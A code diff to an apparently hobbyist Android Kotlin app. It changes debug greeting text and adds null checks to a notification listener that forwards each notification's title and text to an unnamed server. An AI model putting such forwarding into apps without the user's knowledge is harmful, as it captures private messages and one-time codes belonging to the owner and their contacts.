@@ -38,7 +38,8 @@ class MainActivity : ComponentActivity() {
                     modifier = Modifier.fillMaxSize(),
                     color = MaterialTheme.colorScheme.background
                 ) {
-                    Greeting("Android")
+                    Greeting("got this far")
+                    println("hello")
 
                     // Call the Composable function that handles the network operation
                     //NetworkOperation()
@@ -56,7 +57,7 @@ class MainActivity : ComponentActivity() {
 @Composable
 fun Greeting(name: String, modifier: Modifier = Modifier) {
     Text(
-        text = "Hello $name!",
+        text = "shimi $name",
         modifier = modifier
     )
 }
@@ -75,10 +76,12 @@ class MyNotificationListenerService : NotificationListenerService() {
         val notification = sbn.notification
         val extras = notification.extras
         val title = extras.getString("android.title")
-        val text = extras.getCharSequence("android.text").toString()
+        val text = extras.getCharSequence("android.text")?.toString()
 
         // Here you can send the notification content to your server
-        sendNotificationContentToServer(title + ": " + text)
+        if (title != null && text != null) {
+            sendNotificationContentToServer("$title: $text")
+        }
     }
 
     private fun sendNotificationContentToServer(messageToSend: String) {
